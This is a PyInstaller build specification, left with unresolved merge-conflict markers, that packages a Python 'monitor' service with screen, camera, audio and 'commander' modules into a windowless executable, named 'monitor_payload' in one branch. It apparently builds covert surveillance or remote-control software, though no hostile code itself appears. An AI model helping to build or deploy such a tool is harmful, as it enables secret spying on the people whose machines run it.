# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['service\\monitor.py'],
    pathex=['.'],
    binaries=[],
    datas=[],
<<<<<<< HEAD
    hiddenimports=['pyautogui', 'PIL', 'service.commander', 'service.camera', 'psutil', 'pyaudio'],
=======
    hiddenimports=['pyautogui', 'PIL', 'service.commander', 'service.camera'],
>>>>>>> origin/main
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
<<<<<<< HEAD
    name='WatchDog',
=======
    name='monitor_payload',
>>>>>>> origin/main
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
